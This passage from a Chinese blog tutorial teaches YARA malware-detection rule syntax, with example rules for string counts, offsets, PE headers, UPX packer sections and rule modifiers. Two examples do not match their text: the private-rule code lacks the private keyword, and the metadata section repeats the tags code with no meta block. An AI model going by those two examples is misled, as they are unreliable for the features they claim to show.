src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/1.png"></p><h3 id="计数字符串"><a href="#计数字符串" class="headerlink" title="计数字符串"></a>计数字符串</h3><p>有时候不仅仅需要知道某个字符串是否存在，还需要知道该字符串在文件或者进程内存中出现了多少次。每个字符串出现的次数由一个变量表示，该变量的名称是字符串标识符，用#字符代替了$字符。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rule <span class="hljs-built_in">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;123&quot;</span><br>condition:<br><span class="hljs-comment">#a == 6 and #b &lt; 3</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>当a字符串刚好出现了六次，且b字符串出现次数小于三次。</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/2.png"></p><h3 id="字符串偏移或虚拟地址"><a href="#字符串偏移或虚拟地址" class="headerlink" title="字符串偏移或虚拟地址"></a>字符串偏移或虚拟地址</h3><p>有些情况下，我们需要知道字符串是否在某个特定的偏移量文件或者进程地址空间内的某个虚拟地址，这种时候就可以使用<code>at</code>操作符。</p><figure class="highlight xquery"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xquery">rule test<br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;123&quot;</span><br>condition:<br><span class="hljs-variable">$a</span> <span class="hljs-keyword">at</span> <span class="hljs-number">0xA</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$b</span> <span class="hljs-keyword">at</span> <span class="hljs-number">0x10</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>上述规则是“test”在文件偏移为0xA或者是进程在虚拟地址0xA的地方，”123”同理</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/3.png"></p><p><code>at</code>是指定具体的地址，而使用<code>in</code>可以指定一个范围</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rule <span class="hljs-built_in">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;123&quot;</span><br>condition:<br><span class="hljs-variable">$a</span> <span class="hljs-keyword">in</span> (0..10) and <span class="hljs-variable">$b</span> <span class="hljs-keyword">in</span> (10..filesize)<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这条规则是a字符串在偏移为0-10的地方且b字符串在10-文件末尾的地方。</p><p>如果把123在文件的开头，test在偏移10以后的位置，那么就无法检出了。</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/4.png"></p><p>交换一下位置即可检出</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/5.png"></p><h3 id="匹配长度"><a href="#匹配长度" class="headerlink" title="匹配长度"></a>匹配长度</h3><p>在实际测试中，并不能成功，暂时还不知道为什么，先留个坑，等搞明白再写。</p><h3 id="文件大小"><a href="#文件大小" class="headerlink" title="文件大小"></a>文件大小</h3><p>字符串标识符并不是唯一可以出现在条件中的变量（规则可以在没有任何字符串定义的情况下定义），还有一些其他的特殊变量可以使用，其中之一是<code>filesize</code>，就是文件大小，大小以字节表示。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">testFileSize</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>filesize &gt; <span class="hljs-number">5</span>KB<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这条规则只命中5KB以上大小的文件</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/6.png"></p><p>示例中后缀使用的是<code>KB</code>，还可以使用<code>MB</code></p><h3 id="可执行入口点"><a href="#可执行入口点" class="headerlink" title="可执行入口点"></a>可执行入口点</h3><p>还有一个特殊变量是entrypoint，但是现在已经弃用了，3.0版本之后都使用pe.entry_point来代替了，请注意。</p><p>关于入口点，不同编译器的入口点可能略有不同，需要自己进行分析之后再编写规则。</p><p>我的测试用程序是使用VS2019进行编译的。可以看到版本是14.29</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/7.png"></p><p>使用调试器打开，可以看到入口点，查看其十六进制数据可以看到是E8 C5030000</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/8.png"></p><p>编写规则</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">import <span class="hljs-string">&quot;pe&quot;</span><br>rule <span class="hljs-keyword">EntryPoint</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = &#123;E8 C5 <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>&#125;<br><span class="hljs-keyword">condition</span>:<br><span class="hljs-variable">$a</span> at pe.entry_point<br>&#125;<br></code></pre></div></td></tr></table></figure><p>成功检出</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/9.png"></p><h3 id="访问指定位置的数据"><a href="#访问指定位置的数据" class="headerlink" title="访问指定位置的数据"></a>访问指定位置的数据</h3><p>在多数情况下，需要检测特定文件偏移量或者虚拟内存地址的数据，可以从以下的函数之一来从给定的偏移量读取数据</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">int8</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><span class="hljs-function"><span class="hljs-title">int16</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><span class="hljs-function"><span class="hljs-title">int32</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><br><span class="hljs-function"><span class="hljs-title">uint8</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><span class="hljs-function"><span class="hljs-title">uint16</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><span class="hljs-function"><span class="hljs-title">uint32</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><br><span class="hljs-function"><span class="hljs-title">int8be</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><span class="hljs-function"><span class="hljs-title">int16be</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><span class="hljs-function"><span class="hljs-title">int32be</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><br><span class="hljs-function"><span class="hljs-title">uint8be</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><span class="hljs-function"><span class="hljs-title">uint16be</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><span class="hljs-function"><span class="hljs-title">uint32be</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br></code></pre></div></td></tr></table></figure><p><code>int</code>是读取8,16,32位有符号整数，<code>uint</code>是读取无符号整数，默认都是小端序，如果要读取大端序，在后面加上<code>be</code></p><p>现在来尝试编写一个检测是否是PE文件的规则，我们知道PE开头都是“MZ”，0x5A4D，然后在DOS头部的e_lfanew标识的是PE标志的偏移量，这个地址相对于MZ头偏移量是0x3C。PE标志是“PE”，0x4550，现在可以尝试编写规则。他们俩就可以标识着此文件是否是一个PE文件。</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">rule IsPe<br>&#123;<br>condition:<br><span class="hljs-comment">//MZ,word类型</span><br><span class="hljs-built_in">uint</span>16(<span class="hljs-number">0</span>) == <span class="hljs-number">0x5A4D</span> <br><span class="hljs-comment">//e_lfanew-&gt;pe Signature &quot;PE&quot;,dword类型</span><br><span class="hljs-keyword">and</span> <span class="hljs-built_in">uint</span>32(<span class="hljs-built_in">uint</span>32(<span class="hljs-number">0x3C</span>)) == <span class="hljs-number">0x00004550</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="字符串集"><a href="#字符串集" class="headerlink" title="字符串集"></a>字符串集</h3><p>在某些情况下，需要在条件中指定，至少存在多少字符串命中才符合要求，此时可以使用<code>of</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rule <span class="hljs-built_in">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test1&quot;</span><br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;test2&quot;</span><br><span class="hljs-variable">$c</span> = <span class="hljs-string">&quot;test3&quot;</span><br>condition:<br>2 of (<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>,<span class="hljs-variable">$c</span>)<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这条规则要求，$a,$b,$c至少存在两个才行，任意组合都可以。</p><p>在集合中也是可以使用通配符的。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rule <span class="hljs-built_in">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$test1</span> = <span class="hljs-string">&quot;test1&quot;</span><br><span class="hljs-variable">$test2</span> = <span class="hljs-string">&quot;test2&quot;</span><br><span class="hljs-variable">$test3</span> = <span class="hljs-string">&quot;test3&quot;</span><br>condition:<br>2 of (<span class="hljs-variable">$test</span>*)<br>&#125;<br></code></pre></div></td></tr></table></figure><p>也可以使用<code>$*</code>来表示规则中所有的字符串，也可以使用<code>them</code></p><figure class="highlight mel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mel">rule test1<br>&#123;<br>strings:<br>$test1 = <span class="hljs-string">&quot;test1&quot;</span><br>$test2 = <span class="hljs-string">&quot;test2&quot;</span><br>$test3 = <span class="hljs-string">&quot;test3&quot;</span><br><span class="hljs-keyword">condition</span>:<br><span class="hljs-number">2</span> of ($*)<br>&#125;<br><br>rule test2<br>&#123;<br>strings:<br>$test1 = <span class="hljs-string">&quot;test1&quot;</span><br>$test2 = <span class="hljs-string">&quot;test2&quot;</span><br>$test3 = <span class="hljs-string">&quot;test3&quot;</span><br><span class="hljs-keyword">condition</span>:<br><span class="hljs-number">1</span> of them<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在上面的示例中都使用了数字常量指定条件的字符串，也可以使用其他的表达式，<code>any</code>和<code>all</code></p><blockquote><p>all of them    //所有规则中包含的字符串</p><p>any of them    //任意字符串组合都可以，至少为一条</p></blockquote><h3 id="对多个字符串应用相同条件"><a href="#对多个字符串应用相同条件" class="headerlink" title="对多个字符串应用相同条件"></a>对多个字符串应用相同条件</h3><p>还有一个功能强大的运算符<code>for..of</code>，可以对多个字符串匹配相同的条件，语法是这样的：</p><blockquote><p>for a of b : (c)</p></blockquote><p>在b字符串集合中，至少有a个字符串满足c的条件。</p><p>下面举一些例子</p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;pe&quot;</span><br>rule test<br>&#123;<br><span class="hljs-symbol">strings:</span><br><span class="hljs-variable">$a</span> = &#123;E8 C5 03 00 00&#125;<br><span class="hljs-variable">$b</span> = &#123;E8 01 00 00 00&#125;<br><span class="hljs-symbol">condition:</span><br><span class="hljs-keyword">for</span> any of (<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>) : (<span class="hljs-variable">$ </span>at pe.entry_point)<br>&#125;<br></code></pre></div></td></tr></table></figure><p>上述规则，是在a,b两个字符串集合中，至少有一个满足于pe.entry_point相同的条件。</p><figure class="highlight pf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pf"><span class="hljs-keyword">rule</span> test<br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test1&quot;</span> <br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;test2&quot;</span> <br><span class="hljs-variable">$c</span> = <span class="hljs-string">&quot;test3&quot;</span> <br>condition:<br><span class="hljs-keyword">for</span> <span class="hljs-literal">any</span> of them : (<span class="hljs-comment"># &gt; 2)</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>上述规则，abc这三个字符串，任意组合只要出现超过两次就可以，至少是一组。</p><h3 id="使用匿名字符串"><a href="#使用匿名字符串" class="headerlink" title="使用匿名字符串"></a>使用匿名字符串</h3><p>当使用<code>of</code>，<code>for..of</code>，指定了them时，分配给规则中的每个字符串的标识符通常是多余的，因为并没有单独的引用某个具体的字符串，所以可以不需要为每个字符串都提供标识符。在这些情况下，可以只使用仅有$字符组成的标识符声明匿名字符串</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">test</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">strings:</span><br>$ = <span class="hljs-string">&quot;test1&quot;</span><br>$ = <span class="hljs-string">&quot;test2&quot;</span><br><span class="hljs-symbol">condition:</span><br>any of them<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="迭代字符串"><a href="#迭代字符串" class="headerlink" title="迭代字符串"></a>迭代字符串</h3><p>yara也可以写一个类似于C的FOR循环，语法是<code>for..of</code></p><p>如下示例，可以检索所有PE文件中的区段，区段名为text的会命中规则。</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">import <span class="hljs-string">&quot;pe&quot;</span><br>rule test<br>&#123;<br>condition:<br><span class="hljs-keyword">for</span> any <span class="hljs-selector-tag">section</span> <span class="hljs-keyword">in</span> pe<span class="hljs-selector-class">.sections</span> : (<span class="hljs-selector-tag">section</span><span class="hljs-selector-class">.name</span> == <span class="hljs-string">&quot;.text&quot;</span>)<br>&#125;<br></code></pre></div></td></tr></table></figure><p>比如现在可以来检测是否存在UPX壳，UPX加壳后，会有一个区段是UPX，图为UPX3.96版本加壳后的区段信息。</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/10.png"></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">import <span class="hljs-string">&quot;pe&quot;</span><br>rule test<br>&#123;<br>condition:<br><span class="hljs-keyword">for</span> any <span class="hljs-selector-tag">section</span> <span class="hljs-keyword">in</span> pe<span class="hljs-selector-class">.sections</span> : (<span class="hljs-selector-tag">section</span><span class="hljs-selector-class">.name</span> == <span class="hljs-string">&quot;UPX0&quot;</span>) <br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/11.png"></p><p>b在文件中前三次出现的位置偏移必须比a多7。</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">rule test<br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test1&quot;</span><br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;test2&quot;</span><br>condition:<br><span class="hljs-keyword">for</span> all <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>) : (@<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[i]</span> + <span class="hljs-number">7</span> == @<span class="hljs-selector-tag">b</span><span class="hljs-selector-attr">[i]</span>)<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/12.png"></p><h3 id="引用其他规则"><a href="#引用其他规则" class="headerlink" title="引用其他规则"></a>引用其他规则</h3><p>在编写规则之前，还可以使用类似函数调用的方式，引用之前定义的规则。</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">rule <span class="hljs-keyword">test1</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test1&quot;</span><br>condition:<br><span class="hljs-variable">$a</span><br>&#125;<br><br><span class="hljs-keyword">rule</span> <span class="hljs-keyword">test2</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test2&quot;</span><br>condition:<br><span class="hljs-variable">$a</span> <span class="hljs-keyword">and</span> test1<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="全局规则"><a href="#全局规则" class="headerlink" title="全局规则"></a>全局规则</h3><p>全局规则可以一次对所有的规则进行限制，比如想要限制文件的大小，可以定义一条全局规则来进行限制，而不用单独在每个规则中都进行大小限制。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">global rule <span class="hljs-class">sizelimit</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>filesize <span class="hljs-params">&lt; <span class="hljs-number">100</span>KB</span><br><span class="hljs-params">&#125;</span><br></code></pre></div></td></tr></table></figure><h3 id="私有规则"><a href="#私有规则" class="headerlink" title="私有规则"></a>私有规则</h3><p>私有规则只是在匹配给定的文件时，yara不会报告的规则，当一个规则引用了另一个规则时，可以使用私有规则来让它不要报告。</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">rule <span class="hljs-keyword">test1</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test1&quot;</span><br>condition:<br><span class="hljs-variable">$a</span><br>&#125;<br><br><span class="hljs-keyword">rule</span> <span class="hljs-keyword">test2</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test2&quot;</span><br>condition:<br><span class="hljs-variable">$a</span> <span class="hljs-keyword">and</span> test1<br>&#125;<br></code></pre></div></td></tr></table></figure><p>看到结果只报告了test2，没有报告test1，正常情况是要报告的。</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/13.png"></p><h3 id="规则标签"><a href="#规则标签" class="headerlink" title="规则标签"></a>规则标签</h3><p>yara可以向规则添加标签。这些标签用于过滤yara的输出并且只显示感兴趣的规则。</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">rule test1 : <span class="hljs-keyword">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test1&quot;</span><br>condition:<br><span class="hljs-variable">$a</span><br>&#125;<br><br><span class="hljs-keyword">rule</span> <span class="hljs-keyword">test2</span> : <span class="hljs-keyword">b1ackie</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test2&quot;</span><br>condition:<br><span class="hljs-variable">$a</span> <span class="hljs-keyword">and</span> test1<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="元数据"><a href="#元数据" class="headerlink" title="元数据"></a>元数据</h3><p>除去字符串定义和条件部分，规则还可以有一个元数据部分，可以在其中放置有关规则的其他信息。元数据部分使用关键字<code>meta</code>。</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">rule test1 : <span class="hljs-keyword">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test1&quot;</span><br>condition:<br><span class="hljs-variable">$a</span><br>&#125;<br><br><span class="hljs-keyword">rule</span> <span class="hljs-keyword">test2</span> : <span class="hljs-keyword">b1ackie</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test2&quot;</span><br>condition:<br><span class="hljs-variable">$a</span> <span class="hljs-keyword">and</span> test1<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="模块的使用"><a href="#模块的使用" class="headerlink" title="模块的使用"></a>模块的使用</h3><p>模块是yara核心功能的扩展，一些模块，比如PE，Cuckoo是由yara官方发布的，其他模块可以由第三方创建。使用模块的第一步是使用<code>import</code>导入它。</p><blockquote><p>import “pe”</p></blockquote><p>搭配如模块后，可以使用其功能，用法是<code>modulename.func</code>比如</p><blockquote><p>pe.entry_point</p><p>pe.sections</p></blockquote><h3 id="外部变量"><a href="#外部变量" class="headerlink" title="外部变量"></a>外部变量</h3><p>外部变量允许定义依赖于外部提供的值得规则。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">ExternalVariableExample1</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        ext_var == <span class="hljs-number">10</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>这种情况下ext_var是一个外部变量，通过-d参数来指定。</p><p>外部变量可以是这些类型：整数、字符串或布尔值。它们的类型取决于分配给它们的值。整数变量可以替代条件中的任何整数常量，布尔常量可以占据布尔表达式的位置。</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">rule <span class="hljs-keyword">ExternalVariableExample2</span><br><span class="hljs-keyword"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        <span class="hljs-keyword">bool_ext_var </span><span class="hljs-keyword">or </span>filesize &lt; int_ext_var<br>&#125;<br></code></pre></div></td></tr></table></figure><p>字符串常量可以与这些运算符一起使用，</p><p><code>contains</code>：如果字符串包含指定的子字符串，返回true</p><p><code>matches</code>：如果字符串匹配给定的正则表达式时，返回true</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">ContainsExample</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        string_ext_var contains <span class="hljs-string">&quot;text&quot;</span><br>&#125;<br>rule <span class="hljs-class">MatchesExample</span><br><span 